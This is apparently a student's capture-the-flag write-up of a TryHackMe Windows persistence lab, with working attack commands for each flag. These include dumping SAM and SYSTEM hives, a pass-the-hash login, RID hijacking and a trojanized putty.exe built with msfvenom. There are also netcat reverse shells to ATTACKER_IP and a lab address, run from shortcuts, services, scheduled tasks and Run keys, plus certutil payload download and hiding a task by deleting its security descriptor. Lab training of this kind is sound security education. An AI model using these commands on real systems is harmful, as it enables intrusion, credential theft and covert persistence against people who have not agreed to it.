# Windows Local Persistence

### Tampering With Unprivileged Accounts
- Insert flag1 here<br />
We can check that the server has WinRM enabled with the command `Test-WSMan`. <br />
First, add thmuser1 to the backup group: `net localgroup "Backup Operators" thmuser1 /add`, and to the winRM group: `net localgroup "Remote Management Users" thmuser1 /add` Now, we need to disable LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. To do that, run `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`. Now we can download password hashes: 

      reg save hklm\system system.bak
      reg save hklm\sam sam.bak
      download system.bak
      download sam.bak
  
And dump them:

      python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Then, we perform a pass-the-hash attack: `evil-winrm -i 10.10.62.15 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3`. <br /> Flag is `THM{FLAG_BACKED_UP!}`
- Insert flag2 here<br />
Run `secedit /export /cfg config.inf` to export the configuration file, then open it and edit it by adding our user to the SeBackupPrivilege and SeRestorePrivilege lines: <br />
![image](https://github.com/user-attachments/assets/fa5d5842-8547-4594-89a2-3e218ce924b2)<br />
Now load the configuration back into the system:

      secedit /import /cfg config.inf /db config.sdb
      
      secedit /configure /db config.sdb /cfg config.inf
However, the user still can't log over winRM because it is not in the "Remote Management Users" group.  Instead of adding the user to the Remote Management Users group, we'll change the **security descriptor** associated with the WinRM service to allow thmuser2 to connect. So, run `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` on powershell: <br />
![image](https://github.com/user-attachments/assets/a7c6d479-ed38-4560-a179-8fd3d6132b63)<br />
We can now log in the account from our attackbox whenever we want: <br />
![image](https://github.com/user-attachments/assets/ad1387a5-522f-4272-8056-899db8a941dd)<br />
`THM{IM_JUST_A_NORMAL_USER}`

- Insert flag3 here<br />
The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec: `.\PsExec64.exe -i -s regedit`<br />
Go to HKLM\SAM\SAM\Domains\Account\Users\, and click on 0x3F2, which is the hexadecimal value for 1010(thmuser3 RID).<br />
From there, the value "F" holds the user RID<br />
![image](https://github.com/user-attachments/assets/a2827e8c-f267-40c2-828e-843f93698cda)<br />
Notice that the RID is stored in little endian. The hexadecimal for 500 is 0x1F4, so we will substitute thmuser3's RID with F4 01. Now, as described in the task, log in thmuser3 via RDP: `xfreerdp /u:thmuser3 /p:Password321 /v:10.10.62.15`. Finally, get the flag: <br />
![image](https://github.com/user-attachments/assets/1ad110d7-35a3-4282-abcc-588f2e9f763f)<br />
`THM{TRUST_ME_IM_AN_ADMIN}`

### Backdooring Files
- Insert flag5 here <br />
You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

            msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
Another way is to change the shortcut file of a .exe in the desktop to point to a script of our own. et's create a simple Powershell script in C:\Windows\System32. The script will execute a reverse shell and then run calc.exe: 

            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
            
            C:\Windows\System32\calc.exe
The final target for the shortcut is: `powershell.exe -WindowStyle hidden C:\Windows\System32\scirpt.ps1`. `-windowstyle hidden` is important because it won't open a powershell window, which might look a bit sus. 
So change the shortcut, open a netcat listener, and run the calculator. Get the flag:<br />
![image](https://github.com/user-attachments/assets/9a7f08a4-cd60-49cb-95c0-d72e83b2465b)<br />
`THM{NO_SHORTCUTS_IN_LIFE}`

By the way, WHERE THE HELL IS FLAG 4!?
- Insert flag6 here<br />
First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1

            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.85.53 4448"
            C:\Windows\system32\NOTEPAD.EXE $args[0]

Now let's change the registry key to run our backdoor script in a hidden window. Move to HKLM\Software\Classes\shell\open\command and edit it: <br />
![image](https://github.com/user-attachments/assets/baa53c54-d822-4755-aa35-31b2d3bbe472)<br />
Finally get the flag: <br />
![image](https://github.com/user-attachments/assets/909c44cc-eff8-41ad-9411-cf8c3bb38762)<br />
`THM{TXT_FILES_WOULD_NEVER_HURT_YOU}`

### Abusing Services
- Insert flag7 here<br />
Let's create a reverse shell with the format of a windows service, using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe`. <br />
You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it. To transfer the payload, we can open an http server with python: `python3 -m http.server 8000`, then donwload it from powershell using certutil: `certutil -urlcache -split -f http://10.11.85.53/rev-svc.exe rev-svc.exe`<br />

At this point we can create a service pointing to this payload, scheduled to start every time the machine is started: 

      sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
Now open a netcat listener, and start the service: 

      sc.exe start THMservice2
![image](https://github.com/user-attachments/assets/75934e7d-2541-45c8-b733-0a6d9b2d0a7f)<br />
`THM{SUSPICIOUS_SERVICES}`

- Insert flag8 here<br />
I dont really want to create a different payload, to configure the existing service, just run: `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"`, and do the same as before to get the flag: <br />
![image](https://github.com/user-attachments/assets/8c4c08cc-1e1c-458e-a4b2-f53a1298d7e7)<br />
`THM{IN_PLAIN_SIGHT}`

### Abusing Scheduled Tasks 
- Insert flag9 here<br />
The following command: `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM` creates a scheduled task that runs every minute, named THM-TaskBackdoor.<br />
The /ru option indicates that the task will run with SYSTEM privileges. now simply open a listener on port 4449 and wait a few seconds: <br />
![image](https://github.com/user-attachments/assets/de18b9cf-e4b9-436b-9836-a18fbd623aa3)<br />
Apparently THM wants me to hide the sheduled task.. damn it. <br />
To hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor** (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.. Run `c:\tools\pstools\PsExec64.exe -s -i regedit` to open the registry. Move to `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor`<br />
![image](https://github.com/user-attachments/assets/f08ca4ac-c3ef-47d6-a428-f03b2b3e572e)<br />
Great:<br />
![image](https://github.com/user-attachments/assets/5fc7b4bb-8937-4507-9b46-c8f0492d254c)<br />
`THM{JUST_A_MATTER_OF_TIME}`

### Logon Triggered Persistence
- Insert flag10 here<br />
Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`<br />
Generate a .exe payload using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe`. <br />
Transfer it to the target machine: <br />
![image](https://github.com/user-attachments/assets/9e30d61a-ff45-4d6a-9558-b319292bb210)<br />
Now log off the machine<br />
![image](https://github.com/user-attachments/assets/ea9cc8d4-82bb-4d0b-ac2e-10d650e855f5)<br />
and log back(you can reconnect from the splitview in THM, or you can use RDP):<br />
![image](https://github.com/user-attachments/assets/1fa42aee-82fc-4586-bd43-fb3f9ed22a6d)<br />
`THM{NO_NO_AFTER_YOU}`
- Insert flag11 here<br />
Move the revshell we used earlier in C:\Windows: `move revshell.exe C:\Windows`. Now use `PsExec64.exe -i -s regedit` to open the registry, edit it this way: <br />
![image](https://github.com/user-attachments/assets/b443a68d-c738-49bc-b13a-6cd393bf3342)<br />
Now sign out and reconnect again (HKLM\Software\Microsoft\Windows\CurrentVersion\Run is an executable that every user will run on log on)<br />
![image](https://github.com/user-attachments/assets/be75f6a3-38b0-4701-b489-1c08ed2d5b43)<br />
`THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}`
- Insert flag12 here<br />
Now use `C:\tools\pstools\PsExec64.exe -i -s regedit` to open the registry. <br />
![image](https://github.com/user-attachments/assets/c8f6bd0a-1bfe-495e-a0aa-4f0469b7e667)<br />
Open a listener, sign out and login again: <br />
![image](https://github.com/user-attachments/assets/bdade126-b433-4e3c-9564-9c7027a54dbc)<br />
`THM{I_INSIST_GO_FIRST}`
- Insert flag13 here<br />
Open the registry again, this time edit it by creating an "Expandable String value": <br />
![image](https://github.com/user-attachments/assets/cba6ddbc-0b22-411a-bc17-e7aa0e4ca99d)<br />
The string name is: `UserInitMprLogonScript`. <br />
Now again open a nc lister, log out and log in again:<br />
`THM{USER_TRIGGERED_PERSISTENCE_FTW}`
### Backdooring the Login Screen / RDP
- Insert flag14 here<br />
- Insert flag15 here<br />

### Persisting Through Existing Services
- Insert flag16 here<br />
- Insert flag17 here<br />

